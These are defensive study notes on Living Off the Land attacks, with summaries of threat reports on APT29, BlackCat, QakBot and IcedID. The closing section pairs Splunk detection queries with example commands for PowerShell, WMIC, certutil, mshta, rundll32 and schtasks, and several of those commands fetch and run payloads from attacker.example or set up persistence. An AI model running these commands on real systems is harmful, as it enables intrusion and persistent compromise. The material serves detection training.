# Living Off the Land Attacks

## Common LoL Tools and Techniques

Built-in tools are already trusted, widely available, allowed by default  
malicious activity hidees among normal operations  

- **PowerShell:** in-memory scripting, remote downloads, automation
- **WMIC or WMI:** run commands locally or remotely; query the system state
- **Certutil:** fetch files, encode/decode payload
- **Mshta:** run HTA content or an inline script delivered by a document or link
- **Rundll32:** invokes DLL exports; riggers URL handlers
- **Schedule tasks:** schedules code and tasks  
- **SysInternals Suite:** blends in with legitimate admin workflows  

### Web Sources of LoL Attacks

[Windows LOLBAS](https://lolbas-project.github.io/#)  Living Off The Land Binaries, Scripts and Libraries  
[Linux GTFOBins](https://gtfobins.org/)  GTFOBins is a curated list of Unix-like executables that can be used to bypass local security restrictions in misconfigured systems.  
[Windows Drivers](https://www.loldrivers.io/)  Living Off The Land Drivers is a curated list of Windows drivers used by adversaries to bypass security controls and carry out attacks. The project helps security professionals stay informed and mitigate potential threats.

### Measures to Reduce Attack Surface

- Applyed layered defensive controls combining endpoint, network, and identity protections
- Implmeent application control policies (AppLocker, windows Defener Appplication Control)  
- Enforce/Use the principles of least privilege by ensuring only administrators can access or use system maangemente utilities
- Configure network rules and DNS filters to block or redirect connections to domains and IPs known for malicious activity
- Maintain clear containment playbooks outlining steps for isolating compromised systems and revoking exposed credentials
- Regulalry review and update access permissions, logging coverage, and control lists to adapt to new attack mothods.

## Real-World Examples

### APT29 (Nobelium) - PowerShell and WMI for Persistence and Execution

[Dissecting One of APT29's Fileless WMI and PowerShell Backdoors](https://cloud.google.com/blog/topics/threat-intelligence/dissecting-one-ofap?utm_source=chatgpt.com)  

#### Summary of the Analysis

The article examines a stealthy backdoor used by the threat group **APT29**, known as **POSHSPY**, highlighting how it achieves persistence, evasion, and covert communication.

#### 1. Purpose and Role of POSHSPY

* POSHSPY is a **secondary (backup) backdoor** deployed in case primary access is lost.
* It is designed for **long-term, covert persistence** inside compromised systems. ([Google Cloud][1])

#### 2. “Living off the Land” Technique

* The malware relies entirely on **legitimate Windows tools**:

  * **PowerShell** for execution
  * **Windows Management Instrumentation (WMI)** for storage and persistence
* This avoids dropping obvious malicious files, making detection extremely difficult. ([Google Cloud][1])

#### 3. WMI-Based Persistence Mechanism

* The backdoor stores its code inside the **WMI repository**, a native Windows database.
* It uses **WMI event subscriptions** (filters, consumers, bindings) to:

  * Automatically trigger execution
  * Maintain persistence across reboots
* Because WMI is a trusted administrative framework, this activity blends in with normal operations. ([Google Cloud][1])

#### 4. Stealth and Evasion Techniques

POSHSPY is highly covert due to:

* Execution via legitimate system processes (no suspicious binaries)
* Minimal or no disk artifacts (mostly in-memory activity)
* **Infrequent communication (“beaconing”)**
* **Encrypted and obfuscated network traffic**
* Use of **legitimate websites for command-and-control (C2)**

These features make both host-based and network-based detection challenging. ([Google Cloud][1])

#### 5. Evolution of the Malware

* Initially deployed as simple PowerShell scripts (2015)
* Later upgraded to use WMI for **more advanced persistence and stealth**
* Observed across multiple victim environments over time, showing reuse and refinement. ([Google Cloud][1])

#### 6. Key Security Implications

* Traditional security tools may miss such threats because:

  * No obvious malware files exist
  * Activity mimics legitimate admin behavior
* Detection requires:

  * **Deep visibility into WMI activity**
  * **Enhanced logging and memory analysis**
  * Behavioral monitoring rather than signature-based detection

---

#### Bottom Line

POSHSPY demonstrates a shift toward **fileless, stealthy malware** that abuses built-in system tools. Its design emphasizes persistence, minimal footprint, and evasion—making it particularly difficult to detect without advanced monitoring and threat hunting capabilities.


### 2022-004: ASD's ACSC Ransomware Profile – ALPHV (aka BlackCat)

["2022-004: ASD's ACSC Ransomware Profile – ALPHV (aka BlackCat)"](https://www.cyber.gov.au/about-us/advisories/2022-004-asdacsc-ransomware-profile-alphv-aka-blackcat?utm_source=chatgpt.com)

#### 1. Overview of ALPHV (BlackCat)

* **ALPHV (BlackCat)** is a **ransomware-as-a-service (RaaS)** operation where affiliates deploy attacks and share profits with developers. ([cyber.gov.au][1])
* First observed in **late 2021**, it is linked to **Russian-speaking cybercriminal groups** and earlier ransomware families like DarkSide and BlackMatter. ([cyber.gov.au][1])

#### 2. Impact and Targeting

* Targets **organizations globally across multiple sectors**, including government, infrastructure, energy, finance, and construction. ([cyber.gov.au][1])
* Encrypts systems to **lock victims out of their data**, disrupting operations and forcing ransom demands.

#### 3. Multi-Layered Extortion Strategy

ALPHV uses **“double/triple extortion” tactics**:

* Encrypts files (primary pressure)
* **Steals and threatens to leak data**
* May threaten **DDoS attacks** if ransom is not paid ([cyber.gov.au][1])

#### 4. Technical Characteristics

* Written in **Rust**, enabling flexibility and cross-platform capability. ([cyber.gov.au][1])
* Targets **Windows, Linux, and VMware ESXi systems**. ([cyber.gov.au][1])
* Uses **polymorphic techniques** to evade antivirus detection. ([cyber.gov.au][1])

#### 5. Attack Lifecycle (Tactics & Techniques)

**Initial Access:**

* Phishing, stolen or brute-forced credentials, and exploiting vulnerabilities
* Commonly targets **RDP and VPN access** ([cyber.gov.au][1])

**Post-Access Activity:**

* Establishes **command-and-control via reverse SSH tunnels**
* Moves laterally using tools like **PsExec and Cobalt Strike**
* Disables security tools (e.g., modifies Windows Defender) ([cyber.gov.au][1])

**Impact Actions:**

* Encrypts data and **deletes backups/snapshots** to prevent recovery
* Exfiltrates data to cloud services before encryption ([cyber.gov.au][1])

#### 6. Ransom Process

* Victims receive instructions to access a **Tor-based negotiation portal**
* Uses **unique access tokens** to secure communications
* Supports negotiation via intermediaries (e.g., incident response firms) ([cyber.gov.au][1])

#### 7. Key Risks

* No guarantee data will be restored after payment
* Paying ransom may **increase likelihood of future attacks** ([cyber.gov.au][1])
* Highly adaptable and difficult to detect due to use of legitimate tools

#### 8. Mitigation Recommendations

Key defenses include:

* **Multi-factor authentication (MFA)** to prevent credential abuse
* **Network segmentation** to limit lateral movement
* **Regular patching and updates**
* **Restricting admin privileges and monitoring tools like PsExec**
* **Offline, encrypted backups** to enable recovery ([cyber.gov.au][1])

---

### 🔐 Summary of CISA Cybersecurity Advisory AA23-242A

**Title:** Identification and Disruption of QakBot Infrastructure
**Link to full report:** [View the official CISA advisory (AA23-242A)](https://www.aha.org/system/files/media/file/2023/09/tlp-clear-joint-cybersecurity-advisory-identification-and-disruption-of-qakbot-infrastructure-8-30-23.pdf?utm_source=chatgpt.com)

---

#### 📌 Overview

This joint advisory from CISA and the FBI describes efforts to identify and disrupt **QakBot**, a long-running and widespread malware platform. The report provides technical details, indicators of compromise (IOCs), and recommended mitigation steps for organizations. ([American Hospital Association][1])

---

#### 🧠 What is QakBot?

* A sophisticated malware (also known as Qbot, Quackbot, Pinkslipbot).
* Active since at least **2008**, initially targeting banking credentials.
* Now commonly used as an entry point for broader cyberattacks, including ransomware and account compromise. ([American Hospital Association][1])

---

#### 🌐 Key Event: Global Disruption Operation

* On **August 25, 2023**, the FBI and international partners conducted a coordinated operation.
* This operation **took control of QakBot infrastructure**, effectively cutting off infected systems from attacker-controlled servers.
* The disruption severed communication between compromised devices and command-and-control (C2) systems. ([American Hospital Association][1])

---

#### ⚠️ Important Risk Insight

* Even though infrastructure was disrupted, **existing infections or deployed malware may still remain on systems**.
* Organizations must not assume they are safe solely due to the takedown. ([American Hospital Association][1])

---

#### 🔍 Indicators of Compromise (IOCs)

* The advisory includes extensive technical indicators identified through FBI investigations.
* These IOCs help organizations detect potential infections or past compromise in their networks. ([American Hospital Association][1])

---

#### 🛡️ Recommended Actions

Organizations are strongly encouraged to:

* Implement mitigation strategies outlined in the advisory.
* Monitor systems for QakBot-related activity using provided IOCs.
* Apply incident response procedures if compromise is suspected.
* Report findings to appropriate authorities (e.g., FBI or CISA). ([American Hospital Association][1])

---

#### 🧩 Broader Context

* QakBot is part of a larger cybercriminal ecosystem and has contributed to **thousands of infections globally**.
* It often spreads via phishing and serves as a gateway for more severe attacks like ransomware. ([American Hospital Association][1])

---

#### ✅ Bottom Line

The advisory highlights a major law enforcement success in disrupting QakBot infrastructure but emphasizes that **organizations must remain vigilant**, actively hunt for residual threats, and strengthen defenses to prevent reinfection or follow-on attacks.


 
 Here is a **structured markdown outline summary** of the Malpedia page on **IcedID (win.icedid)**:

---

### IcedID (win.icedid) — Structured Summary

#### 1. Overview

* **Malware name:** IcedID
* **Aliases:** BokBot, IceID
* **Type:** Banking malware / modular loader
* **First observed:** 2017 ([malpedia.caad.fkie.fraunhofer.de][1])
* **Primary function:**

  * Steals financial credentials (banking trojan behavior) ([Check Point Software][2])
  * Acts as a **loader** for additional malware (e.g., ransomware) ([malpedia.caad.fkie.fraunhofer.de][1])

#### 2. Threat Actors

* **Associated actors:**

  * GOLD CABIN
  * Lunar Spider (developer/operator) ([malpedia.caad.fkie.fraunhofer.de][1])

#### 3. Architecture & Infection Chain

##### 3.1 Core Components

* Initial **loader stage**

  * Contacts command-and-control (C2) server
* Downloads:

  * DLL loader
  * Final IcedID bot payload ([malpedia.caad.fkie.fraunhofer.de][1])

##### 3.2 Capabilities

* Credential harvesting (especially banking data) ([Check Point Software][2])
* Malware delivery (secondary payloads) ([malpedia.caad.fkie.fraunhofer.de][1])
* Network propagation after infection ([Check Point Software][2])

##### 3.3 Evasion Techniques

* Process injection to hide activity
* Steganography for concealing data ([Check Point Software][2])

#### 4. Evolution & Variants

##### 4.1 Original Version

* Single dominant version from **2017–2022** ([malpedia.caad.fkie.fraunhofer.de][1])

##### 4.2 IcedID Lite (2022)

* Observed in **Emotet campaigns**
* Characteristics:

  * Uses static URL to download payload (`botpack.dat`)
  * Reduced functionality:

    * Lacks web injection
    * No backconnect features ([malpedia.caad.fkie.fraunhofer.de][1])

##### 4.3 Forked Variant (2023)

* Distributed by:

  * TA581 and other clusters
* Delivery methods:

  * Email attachments (e.g., OneNote, .URL files) ([malpedia.caad.fkie.fraunhofer.de][1])

#### 5. Distribution Methods

* Common infection vectors:

  * Malspam campaigns
  * Botnets (notably Emotet) ([Check Point Software][2])
  * Malicious attachments (e.g., Office, OneNote, URL files) ([malpedia.caad.fkie.fraunhofer.de][1])

#### 6. Persistence & Behavior

* Establishes persistence via:

  * Registry run keys ([MITRE ATT&CK][3])
* Uses:

  * HTTPS for C2 communication ([MITRE ATT&CK][3])
* Performs:

  * Account discovery (e.g., via LDAP, system commands) ([MITRE ATT&CK][3])

#### 7. Attack Techniques

* Browser session hijacking

  * Web injection attacks to steal credentials ([MITRE ATT&CK][3])
* Redirection to spoofed banking sites
* Maintains simultaneous legitimate session to avoid detection ([MITRE ATT&CK][3])

#### 8. Role in Cybercrime Ecosystem

* Functions as:

  * Initial access malware
  * Loader for ransomware and other payloads
* Frequently part of multi-stage attacks ([malpedia.caad.fkie.fraunhofer.de][1])

#### 9. Detection

* YARA rules available:

  * Based on binary patterns and code sequences
* Detection considerations:

  * Rules may vary in generalization due to limited sample sets ([malpedia.caad.fkie.fraunhofer.de][1])

---

#### Key Takeaways

* IcedID evolved from a **banking trojan** into a **multi-purpose malware loader**.
* It plays a major role in **initial compromise and malware delivery chains**.
* Continuous development has introduced **lighter and forked variants** with modified capabilities.
* Its modular design and stealth techniques make it a **persistent and adaptable threat**.

---

[1]: https://malpedia.caad.fkie.fraunhofer.de/details/win.icedid?utm_source=chatgpt.com "IcedID (Malware Family)"
[2]: https://www.checkpoint.com/cyber-hub/threat-prevention/what-is-malware/icedid-malware/?utm_source=chatgpt.com "IcedID Malware - Check Point Software"
[3]: https://attack.mitre.org/software/S0483/?utm_source=chatgpt.com "IcedID, Software S0483 | MITRE ATT&CK®"

## Detecting LoL Activity

### PowerShell

runs scripts directly in memory without creating files  
automates system actions  
interacts with the network  
bypassess some execution policies  

```Powershell
# PowerShell LOL
    PS C:\> powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX (New-Object System.Net.WebClient).DownloadString('http://attacker.example/payload.ps1')"
    PS C:\> powershell -NoP -NonI -W Hidden -EncodedCommand SQBn...Base64...
    PS C:\> powershell -NoP -NonI -Command "Invoke-WebRequest 'http://attacker.example/file.exe' -OutFile 'C:\Users\Public\updater.exe'; Start-Process 'C:\Users\Public\updater.exe'"
```

1. the IEX DownloadString fetches a script from a rremote server and immediately runs it in memory  
2. `-EncodedCommand` hides the payload in base64
3. Downloads and executes `file.exe`  

#### Powershell Detection

```text
    index=wineventlog OR index=sysmon (EventCode=4688 OR EventCode=1 OR EventCode=4104)
    (CommandLine="*powershell*IEX*" OR CommandLine="*powershell*-EncodedCommand*" OR CommandLine="*powershell*-Exec Bypass*" OR CommandLine="*Invoke-WebRequest*" OR CommandLine="*DownloadString*" OR CommandLine="*Invoke-RestMethod*")
    | stats count values(Host) as hosts values(User) as users values(ParentImage) as parents by CommandLine
```


### Windows Management Instrumentation Command-line (WMIC)

permist administrators to query and manage local or remote Windows systems.  

```powershell
    PS C:\> wmic /node:TARGETHOST process call create "powershell -NoP -Command IEX(New-Object Net.WebClient).DownloadString('http://attacker.example/payload.ps1')"
    PS C:\> wmic /node:TARGETHOST process get name,commandline
    PS C:\> wmic process call create "notepad.exe" /hidden
```

1. The operator targets a remote host and requests the r emote host create a new process. The new process is a PowerShell instance. The PowerShell instance downloads and executes a remote script. WMIC acts as a r emote launcher
2. The tool queries the remote syste for running processes and command lines. The returned, structured responses are useful for recon across hosts
3. The local WMIC `process call create` API is used to spawn `notepad.exe`. The optinoal hiding flag demonstrates an an attacker might spawn less visible processes

#### WMIC Detection

```text
    index=sysmon OR index=wineventlog (EventCode=1 OR EventCode=4688)
    (CommandLine="*\\wmic.exe*process call create*" OR CommandLine="*wmic /node:* process call create*" OR CommandLine="*wmic*process get Name,CommandLine*")
    | stats count values(Host) as hosts values(User) as users values(ParentImage) as parents by CommandLine
```

### Certutil

- Microsoft tool for certificate management, encoding/decoding data.  
- downloads files with `-urlcache`  
- can decode base64, turning blobs into binaries  
- is signed by Microsoft and is common an admin workflows  
- bypassess simple blocking rules which might stop curl  

```powershell
    PS C:\> certutil -urlcache -split -f "http://attacker.example/payload.exe" C:\Users\Public\payload.exe
    PS C:\> certutil -decode C:\Users\Public\encoded.b64 C:\Users\Public\decoded.exe
    PS C:\> certutil -encode C:\Users\Public\payload.exe C:\Users\Public\payload.b64
```  

1. The `-urllcache -split -f` fetches the remote URL and writes to a specified local path. The resultant file is dropped on disk for later execution.  
2. Decode `encoded.b64` and write out to `decoed.exe` 
3. encoees an existing binary into bas64 text and writes out to `payload.b64` to obvuscate the payload during staging or transit.

#### Certutil Detection/Alert

```text
index=sysmon OR index=wineventlog (EventCode=1 OR EventCode=4688 OR EventCode=4663)
(Image="*\\certutil.exe" OR CommandLine="*certutil*")
(CommandLine="* -urlcache * -f *" OR CommandLine="* -decode *" OR CommandLine="* -encode *")
| stats count values(Host) as hosts values(User) as users values(ParentImage) as parents by CommandLine
```

### MSHTA

Runs HTML Application (HTA) files which can contain VBScript or JavaScript  

```powershell
    PS C:\> mshta "http://attacker.example/payload.hta"
    PS C:\> mshta "javascript:var s=new ActiveXObject('WScript.Shell');s.Run('powershell -NoP -NonI -W Hidden -Command "Start-Process calc.exe"');close();"
    PS C:\> mshta "C:\Users\Public\malicious.hta"
```

1. MSHTA loads the HTA from a remote server and execute the HTA content in the host context  
2. MSHTA is passed an inlilne javascript URI that creates `WScript.Shell` activeX object and uses the object to run PowerShell; The Powershell starts a process showing how inline script can directly spawn system commands without a saved intermediary.  
3. MSHTA runds a local HOTA file, which can anble an attacker to deliver the HTA as an attachment or drop it on a shared drive.  

#### MSHTA Detection

```text
index=sysmon (EventCode=1 OR EventCode=4688) Image="*\\mshta.exe" (CommandLine="*http*://*" OR CommandLine="*javascript:*" OR CommandLine="*.hta")
| stats count by host, user, ParentImage, CommandLin
```

### Rundll32

Executes specifc exported functions from DLL files

```powershell
PS C:\> rundll32.exe C:\Users\Public\backdoor.dll,Start
PS C:\> rundll32.exe url.dll,FileProtocolHandler "http://attacker.example/update.html"
PS C:\> rundll32.exe C:\Windows\Temp\loader.dll,Run
```

1. Rundll32 loads the specified DLL and calls its exported `Start` function, which runds the DLL's code.
2. Rundll32 invokes `url.dll` with File ProtocolHandler and a remote URL, causing the systme handler to process the remote content, which can bootstrap follow-on activity
3. A `crafted export` in  a temporary DLL, which may execute embedded loader logic or shellcode from a file palced in a writeable location.  

#### RunDll32 Detection

```text
index=sysmon (EventCode=1 OR EventCode=4688 OR EventCode=7) Image="*\\rundll32.exe" (CommandLine="*\\Users\\Public\\*" OR CommandLine="*url.dll,FileProtocolHandler*" OR CommandLine="*\\Windows\\Temp\\*")
| stats count by host, user, ParentImage, CommandLine
```

### Scheduled Tasks

Build-tin Windows automation  
runs programs or scripts at aspecified times, on specified events, or on a repeating schedule.  
Compoents include name, trigger, action, and optional run-as account and conditions.  

```PowerShell
      
PS C:\> schtasks /Create /SC ONLOGON /TN "WindowsUpdate" /TR "powershell -NoP -NonI -Exec Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://attacker.example/ps1')\""
PS C:\> schtasks /Create /SC DAILY /TN "DailyJob" /TR "C:\Users\Public\encrypt.ps1" /ST 00:05
PS C:\> schtasks /Run /TN "WindowsUpdate"
```

1. schtasks creates a t aske named `WindowsUpdate` which runs `PowerShell` to download and execute a remote script on each user logon (achieves persistence)  
2. A daily task named `DailyJob`  is scheduled to run a local script at `00:05` each day to auttomatedd the execution of harmful actions.  
3. The attacker triggers the named task to run immediately, invoking its configured action on demand.  

#### Example Alert

```text
index=wineventlog EventCode=4698 OR EventCode=4699 OR index=sysmon (EventCode=1 OR EventCode=4688) (CommandLine="*schtasks* /Create*" OR CommandLine="*schtasks* /Run*" OR Image="*\\taskeng.exe" OR EventCode=4698)
| stats count by host, user, EventCode, TaskName, CommandLine
```  

